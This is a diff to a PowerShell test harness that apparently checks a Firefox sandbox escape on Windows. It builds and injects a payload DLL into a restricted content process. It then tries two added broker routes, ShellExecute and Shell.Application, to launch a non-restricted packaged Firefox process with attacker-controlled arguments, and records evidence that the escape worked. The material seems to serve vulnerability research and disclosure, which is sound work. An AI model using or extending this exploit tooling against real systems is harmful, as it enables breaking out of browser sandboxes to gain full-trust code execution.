@@ -43,6 +43,12 @@ $Verdict = [ordered]@{
     application_activation_hresult = $null
     application_activation_pid = 0
     application_activation_process_observed = $false
+    shell_execute_api_success = $false
+    shell_execute_error = $null
+    shell_execute_process_observed = $false
+    shell_dispatch_api_success = $false
+    shell_dispatch_hresult = $null
+    shell_dispatch_process_observed = $false
     background_task_registered = $false
     background_task_registration_hresult = $null
     background_proxy_process_observed = $false
@@ -137,6 +143,12 @@ function Write-Summary {
         "- Renderer packaged-app activation succeeded: ``$($Result.application_activation_success)``",
         "- Packaged-app activation HRESULT: ``$($Result.application_activation_hresult)``",
         "- Packaged-app activation process observed: ``$($Result.application_activation_process_observed)``",
+        "- ShellExecute packaged activation succeeded: ``$($Result.shell_execute_api_success)``",
+        "- ShellExecute error: ``$($Result.shell_execute_error)``",
+        "- ShellExecute process observed: ``$($Result.shell_execute_process_observed)``",
+        "- Shell.Application activation succeeded: ``$($Result.shell_dispatch_api_success)``",
+        "- Shell.Application HRESULT: ``$($Result.shell_dispatch_hresult)``",
+        "- Shell.Application process observed: ``$($Result.shell_dispatch_process_observed)``",
         "- Renderer registered package timer: ``$($Result.background_task_registered)``",
         "- Background registration HRESULT: ``$($Result.background_task_registration_hresult)``",
         "- Background-task proxy process observed: ``$($Result.background_proxy_process_observed)``"
@@ -176,7 +188,7 @@ try {
     @"
 @echo off
 call "$VcVars" >nul
-cl.exe /nologo /W4 /EHsc /std:c++20 /MT /DUNICODE /D_UNICODE /DWIN32_LEAN_AND_MEAN /DNOMINMAX /I"$SourceRoot" /LD "$SourceRoot\payload.cpp" /link /OUT:"$Payload" windowsapp.lib runtimeobject.lib ole32.lib advapi32.lib uuid.lib
+cl.exe /nologo /W4 /EHsc /std:c++20 /MT /DUNICODE /D_UNICODE /DWIN32_LEAN_AND_MEAN /DNOMINMAX /I"$SourceRoot" /LD "$SourceRoot\payload.cpp" /link /OUT:"$Payload" windowsapp.lib runtimeobject.lib ole32.lib oleaut32.lib shell32.lib advapi32.lib uuid.lib
 if errorlevel 1 exit /b %errorlevel%
 cl.exe /nologo /W4 /EHsc /std:c++20 /MT /DUNICODE /D_UNICODE /DWIN32_LEAN_AND_MEAN /DNOMINMAX /I"$SourceRoot" "$SourceRoot\driver.cpp" /link /OUT:"$Driver" ole32.lib advapi32.lib uuid.lib
 exit /b %errorlevel%
@@ -286,7 +298,9 @@ exit /b %errorlevel%
     Get-FirefoxProcesses | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
     $InitialProfile = Join-Path $ProfilesRoot "initial-$Nonce"
     $EscapedProfile = Join-Path $ProfilesRoot "escaped-$Nonce"
-    New-Item -ItemType Directory -Path $InitialProfile, $EscapedProfile -Force | Out-Null
+    $ShellExecuteProfile = Join-Path $ProfilesRoot "shell-execute-$Nonce"
+    $ShellDispatchProfile = Join-Path $ProfilesRoot "shell-dispatch-$Nonce"
+    New-Item -ItemType Directory -Path $InitialProfile, $EscapedProfile, $ShellExecuteProfile, $ShellDispatchProfile -Force | Out-Null
     @(
         'user_pref("browser.shell.checkDefaultBrowser", false);',
         'user_pref("browser.startup.page", 0);',
@@ -310,6 +324,8 @@ exit /b %errorlevel%
 
     Write-JsonFile -Value (Get-FirefoxProcesses | Select-Object ProcessId, ParentProcessId, CommandLine) -Path (Join-Path $ArtifactRoot "processes-before.json")
     $EscapedArguments = "-no-remote -new-instance -profile $EscapedProfile -headless about:blank"
+    $ShellExecuteArguments = "-no-remote -new-instance -profile $ShellExecuteProfile -headless about:blank"
+    $ShellDispatchArguments = "-no-remote -new-instance -profile $ShellDispatchProfile -headless about:blank"
     $BackgroundMarker = "winfire-$Nonce"
     $BackgroundTaskName = "${BackgroundMarker}:-no-remote:-new-instance:-headless"
     $Injection = Invoke-DriverJson -Arguments @(
@@ -319,6 +335,8 @@ exit /b %errorlevel%
         "--local-dll", $Payload,
         "--expected-family", $InstalledPackage.PackageFamilyName,
         "--launch-args", $EscapedArguments,
+        "--shell-execute-args", $ShellExecuteArguments,
+        "--shell-dispatch-args", $ShellDispatchArguments,
         "--background-task-name", $BackgroundTaskName,
         "--aumid", $InstalledEvidence.aumid
     ) -EvidenceName "injection.json"
@@ -337,6 +355,10 @@ exit /b %errorlevel%
     $Verdict.application_activation_success = [bool]($Injection.activation_hresult -eq 0 -and $Injection.activation_pid -gt 0)
     $Verdict.application_activation_hresult = $Injection.activation_hresult_hex
     $Verdict.application_activation_pid = $Injection.activation_pid
+    $Verdict.shell_execute_api_success = [bool]$Injection.shell_execute_succeeded
+    $Verdict.shell_execute_error = $Injection.shell_execute_error
+    $Verdict.shell_dispatch_api_success = [bool]($Injection.shell_dispatch_hresult -eq 0)
+    $Verdict.shell_dispatch_hresult = $Injection.shell_dispatch_hresult_hex
     $Verdict.background_task_registered = [bool]$Injection.background_registered
     $Verdict.background_task_registration_hresult = $Injection.background_register_hresult_hex
     $LaunchedProcess = $null
@@ -370,6 +392,38 @@ exit /b %errorlevel%
         }
     }
 
+    if ($Verdict.shell_execute_api_success) {
+        $ShellExecuteProcess = Wait-EscapedFirefoxProcess -ProfileMarker $ShellExecuteProfile -Deadline (Get-Date).AddSeconds(45)
+        if ($null -ne $ShellExecuteProcess) {
+            $ShellExecuteSnapshot = Invoke-DriverJson -Arguments @("inspect", "--pid", $ShellExecuteProcess.ProcessId.ToString()) -EvidenceName "shell-execute-launched.json"
+            $ShellExecuteMarkerObserved = [bool]($ShellExecuteSnapshot.command_line -like "*$ShellExecuteProfile*")
+            $ShellExecuteTokenObserved = [bool](
+                $ShellExecuteSnapshot.integrity_rid -ge 8192 -and
+                -not $ShellExecuteSnapshot.is_restricted -and
+                $ShellExecuteSnapshot.package_family -eq $InstalledPackage.PackageFamilyName
+            )
+            $Verdict.shell_execute_process_observed = [bool]($ShellExecuteMarkerObserved -and $ShellExecuteTokenObserved)
+            $Verdict.controlled_arguments_observed = [bool]($Verdict.controlled_arguments_observed -or $ShellExecuteMarkerObserved)
+            $Verdict.full_trust_token_observed = [bool]($Verdict.full_trust_token_observed -or $ShellExecuteTokenObserved)
+        }
+    }
+
+    if ($Verdict.shell_dispatch_api_success) {
+        $ShellDispatchProcess = Wait-EscapedFirefoxProcess -ProfileMarker $ShellDispatchProfile -Deadline (Get-Date).AddSeconds(45)
+        if ($null -ne $ShellDispatchProcess) {
+            $ShellDispatchSnapshot = Invoke-DriverJson -Arguments @("inspect", "--pid", $ShellDispatchProcess.ProcessId.ToString()) -EvidenceName "shell-dispatch-launched.json"
+            $ShellDispatchMarkerObserved = [bool]($ShellDispatchSnapshot.command_line -like "*$ShellDispatchProfile*")
+            $ShellDispatchTokenObserved = [bool](
+                $ShellDispatchSnapshot.integrity_rid -ge 8192 -and
+                -not $ShellDispatchSnapshot.is_restricted -and
+                $ShellDispatchSnapshot.package_family -eq $InstalledPackage.PackageFamilyName
+            )
+            $Verdict.shell_dispatch_process_observed = [bool]($ShellDispatchMarkerObserved -and $ShellDispatchTokenObserved)
+            $Verdict.controlled_arguments_observed = [bool]($Verdict.controlled_arguments_observed -or $ShellDispatchMarkerObserved)
+            $Verdict.full_trust_token_observed = [bool]($Verdict.full_trust_token_observed -or $ShellDispatchTokenObserved)
+        }
+    }
+
     if (-not $Verdict.api_success -and -not $Verdict.application_activation_success -and $Verdict.background_task_registered) {
         $LaunchedProcess = Wait-EscapedFirefoxProcess -ProfileMarker $BackgroundMarker -Deadline (Get-Date).AddMinutes($BackgroundTaskWaitMinutes)
         if ($null -ne $LaunchedProcess) {
@@ -387,7 +441,13 @@ exit /b %errorlevel%
     }
     Write-JsonFile -Value (Get-FirefoxProcesses | Select-Object ProcessId, ParentProcessId, CommandLine) -Path (Join-Path $ArtifactRoot "processes-after.json")
 
-    if ($Verdict.application_activation_process_observed) {
+    if ($Verdict.shell_execute_process_observed) {
+        $Verdict.status = "CONFIRMED_SHELL_EXECUTE_BROKER"
+        $Verdict.reason = "A restricted untrusted-integrity Firefox content process asked the shell namespace to activate the package with controlled arguments. Windows launched a non-restricted packaged Firefox process carrying the unique profile marker."
+    } elseif ($Verdict.shell_dispatch_process_observed) {
+        $Verdict.status = "CONFIRMED_SHELL_AUTOMATION_BROKER"
+        $Verdict.reason = "A restricted untrusted-integrity Firefox content process invoked the Shell.Application automation broker with controlled arguments. Windows launched a non-restricted packaged Firefox process carrying the unique profile marker."
+    } elseif ($Verdict.application_activation_process_observed) {
         $Verdict.status = "CONFIRMED_APP_ACTIVATION_BROKER"
         $Verdict.reason = "A restricted untrusted-integrity Firefox content process invoked the packaged-app activation broker with the package AUMID and controlled arguments. Windows launched a non-restricted packaged Firefox process carrying the unique profile marker."
     } elseif ($Verdict.background_proxy_process_observed) {
